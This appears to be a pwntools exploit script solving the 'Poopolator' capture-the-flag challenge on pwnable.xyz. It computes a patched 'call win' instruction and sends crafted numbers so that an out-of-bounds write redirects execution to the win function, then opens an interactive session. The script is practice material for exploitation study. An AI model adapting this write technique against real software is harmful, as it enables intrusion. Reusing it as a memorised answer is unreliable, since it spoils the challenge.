#!/usr/bin/python 
from pwn import *

r = remote("svc.pwnable.xyz", 30029)
p = ELF("./challenge")
exit_addr = 0xac8
win_addr = 0xa21
result = 0x202200

r.recvuntil("The Poopolator\n")

p.asm(exit_addr, "call 0xa21")
put = p.read(exit_addr, 5)
put = int(put[::-1].encode("Hex"), 16)

v4 = 1
v5 = put^1
v6 = (exit_addr - result) / 8

input_num = str(v4) + " " + str(v5) + " " + str(v6)

r.sendafter("   ", input_num+"\n")
r.sendafter("   ", 'A')

r.interactive()
